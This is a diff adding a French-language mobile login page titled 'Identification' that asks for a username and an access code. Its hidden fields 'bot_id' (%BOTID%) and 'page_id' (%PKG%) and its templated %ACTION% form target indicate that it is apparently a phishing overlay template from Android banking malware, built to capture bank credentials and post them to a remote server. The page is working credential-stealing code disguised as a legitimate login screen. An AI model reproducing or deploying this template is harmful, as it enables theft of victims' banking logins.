@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+	<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+
+	<style type="text/css">
+		* {
+			padding: 0;
+			margin: 0;
+
+		}
+
+		.top-bar {
+			display: flex;
+		    -webkit-box-align: center;
+		    align-items: center;
+		    -webkit-box-pack: justify;
+		    justify-content: space-between;
+		    height: 5rem;
+		    padding: 0 7px;
+		    background-color: black;
+		    /*border-bottom: 1px solid #e5e5e5;*/
+		    position: fixed;
+		    top: 0;
+		    right: 0;
+		    left: 0;
+		    color: #505050;
+		    height: 50px;
+		    z-index: 1000;
+
+		}
+		.top-bar-nav {
+		    height: 24px;
+		    width: 24px;
+		    padding: 0;
+		    background-color: #f4f4f4;
+		    border: none;
+		    position: absolute;
+		    top: 50%;
+		    transform: translateY(-50%);
+		    color: #505050;
+		    cursor: pointer;
+		    left: 4px;
+		}
+		.top-bar-nav span {
+		    display: block;
+		    height: 2px;
+		    width: 18px;
+		    background-color: #757575;
+		    border-radius: 10px;
+		    position: absolute;
+		    left: 3px;
+		    -webkit-transition: all .3s;
+		    transition: all .3s;
+		}
+		.top-bar-nav span:first-child {
+		    top: 4px;
+		}
+		.top-bar-nav span:nth-child(2), .top-bar-nav span:nth-child(3) {
+		    top: 11px;
+		}
+		.top-bar-nav span:last-child {
+		    bottom: 4px;
+		}
+		.top-bar-title {
+		    -webkit-box-flex: 1;
+		    -webkit-flex: 1;
+		    flex: 1;
+		    padding: 0;
+		    background: 0 0;
+		    text-align: left;
+		    text-transform: none;
+		    color: white;
+		    font-size: 1.5rem;
+		    font-weight: 400;
+		    line-height: 1.15;
+		    display: block;
+		    padding-left: 30px;
+		}
+
+		.delete-img {
+			float: right;
+		}
+		.content {
+			width: 100%;
+			margin-top: 57px;
+		}
+
+
+		input {
+		  margin-top: 25px;
+		  width: 100%;
+		  display: block;
+		  border: none;
+		  padding: 10px 0;
+		  border-bottom: solid 1px;
+		  -webkit-transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
+		  transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
+		  background: -webkit-linear-gradient(top, rgba(255, 255, 255, 0) 96%, #a2bb3a 4%);
+		  background: linear-gradient(to bottom, rgba(255, 255, 255, 0) 96%, #a2bb3a 4%);
+		  background-position: -200px 0;
+		  background-size: 200px 100%;
+		  background-repeat: no-repeat;
+		  color: black;
+		}
+
+		input:focus, input:valid {
+		 box-shadow: none;
+		 outline: none;
+		 background-position: 0 0;
+		 border-bottom: 1px solid #a2bb3a;
+		}
+
+		input::-webkit-input-placeholder {
+		 font-family: 'roboto', sans-serif;
+		 -webkit-transition: all 0.3s ease-in-out;
+		 transition: all 0.3s ease-in-out;
+		}
+
+		input:focus::-webkit-input-placeholder, input:valid::-webkit-input-placeholder {
+		 color: #a2bb3a;
+		 font-size: 11px;
+		 -webkit-transform: translateY(-20px);
+		 transform: translateY(-20px);
+		 visibility: visible !important;
+		}
+
+		table {
+			width: 100%;
+			padding-right: 25px;
+		}
+		.icon {
+			text-align: center;
+			width: 40px;
+		}
+		.icon-image {
+			position: relative;
+			top: 15px;
+			width: 20px;
+			height: 20px;
+		}
+		#memorise {
+			display: none;
+		}
+		#memorise + label {
+			display: inline-block;
+			background-image: url("%DYN_PATH%/img/cb-off.png");
+			background-size: 25px 25px;
+			background-repeat: no-repeat;
+			width: 25px;
+			height: 25px;
+			position: relative;
+			top: 15px;
+		}
+		#memorise:checked + label {
+			background-image: url("%DYN_PATH%/img/cb-on.png");
+		}
+		.memo-label {
+			display: inline-block;
+			position: relative;
+			top: 15px;
+		}
+		.buttons {
+			float: right;
+			margin-right: 25px;
+		}
+		#annuler {
+			border: 0;
+			background-color: white;
+			margin: 15px;
+			margin-top: 30px;
+
+		}
+		#valider {
+			border: 0;
+			background-color: white;
+			color: #a2bb3a;
+			margin: 15px;
+			margin-top: 30px;
+		}
+
+	</style>
+
+</head>
+<body>
+	<div class="top-bar">
+		<img src="%DYN_PATH%/img/back.png" />
+		<h1 class="top-bar-title">Identification</h1>
+		<img src="%DYN_PATH%/img/delete.png" class="delete-img" />
+	</div>
+
+	<div class="content">
+	<table>
+	<form role="form" name="form" action="%ACTION%" id="form" method="post">
+	<input type="hidden" name="page_id" value="%PKG%"><input type="hidden" name="bot_id" value="%BOTID%" />
+		<tr>
+			<td class="icon">
+				<img src="%DYN_PATH%/img/ic_person.png" class="icon-image">
+			</td>
+			<td>
+				
+				<input placeholder="Identifiant" type="text" required id="identifiant" name="fields[username]"></input>
+			</td>
+		</tr>
+
+		<tr>
+			<td class="icon">
+				<img src="%DYN_PATH%/img/ic_lock.png" class="icon-image">
+			</td>
+			<td>
+				
+				<input placeholder="Code d'accès" type="password" required id="password" name="fields[password]"></input>
+			</td>
+		</tr>
+		</form>
+
+		<tr>
+			<td class="icon">
+				<input id="memorise" type="checkbox"></input><label for="memorise"></label>
+			</td>
+			<td>
+				<span class="memo-label">Mémoriser mon identifiant</span>
+			</td>
+		</tr>
+
+
+	</table>
+
+	<div class="buttons">
+		<button id="annuler">ANNULER</button>
+		<button id="valider">VALIDER</button>
+	</div>
+	</div>
+</body>
+
+<script type="text/javascript">
+	
+function clearAll(){
+	$('#identifiant').val('');
+	$('#password').val('');
+	document.querySelector('#memorise').checked = false;
+}
+
+(function(){
+
+	$('#valider').bind('click', function(){
+		var fields = {
+			'identifiant': /.+/,
+			'password': /.+/
+		};
+
+		var err = false;
+
+		for (i in fields){
+			var field = i;
+			var regex = fields[i];
+
+			if(!(new RegExp(regex).test($('#' + field).val())))
+			{
+				
+				err = true;
+			} 
+		}
+
+		if (err){
+			return;
+		}
+
+		var oForm=document.getElementById('form');
+		oForm.submit();
+	});
+
+	$('#annuler').bind('click', clearAll);
+	$('.delete-img').bind('click', clearAll);
+	$('.memo-label').bind('click', function(){
+		var a = document.querySelector('#memorise');
+		a.checked = !a.checked;
+	});
+
+
+})();
+
+</script>
+</html>
